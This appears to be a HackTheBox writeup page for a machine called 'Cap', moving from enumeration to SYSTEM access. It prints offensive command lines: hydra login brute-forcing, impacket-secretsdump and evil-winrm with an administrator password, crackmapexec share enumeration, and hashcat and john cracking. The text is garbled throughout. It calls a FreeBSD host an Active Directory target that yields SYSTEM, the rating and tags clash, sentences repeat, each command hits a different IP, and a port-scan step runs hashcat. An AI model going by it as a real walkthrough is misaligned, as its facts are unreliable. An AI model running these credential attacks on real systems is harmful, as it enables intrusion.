---
TitleSEO: "HackTheBox — Cap (Medium FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Cap (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Cap. Subdomain Takeover and Path Traversal to achieve medium compromise on FreeBSD."
Keywords: "web, active directory, hard"
URL: "https://zurefx.github.io/writeups/htb-cap-819.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-cap-819/"
Date: "2025-09-25"
Tags: "Web, Active Directory, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-cap-819"
Permalink: "/writeups/htb-cap-819.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Cap** is rated **Medium** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.32.9.147`.

### Objectives

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.212.27
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.149.51 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.29.193.244 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.56.248 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.12.67.108/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

Key finding: **Unquoted Service Path**.

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.123.136
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
nmap -sCV -p8888,1433,110 10.59.141.61 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```powershell
gobuster dir -u http://10.25.59.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.34.58.229/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.101.115.18 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
gobuster dir -u http://10.122.103.202/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.107.178 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.104.159.211/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `psexec`
- `hashcat`
- `ligolo-ng`
- `GetUserSPNs`
- `crackmapexec`
- `ffuf`

### Key Takeaways

- Subdomain Takeover
- Path Traversal
- Unquoted Service Path
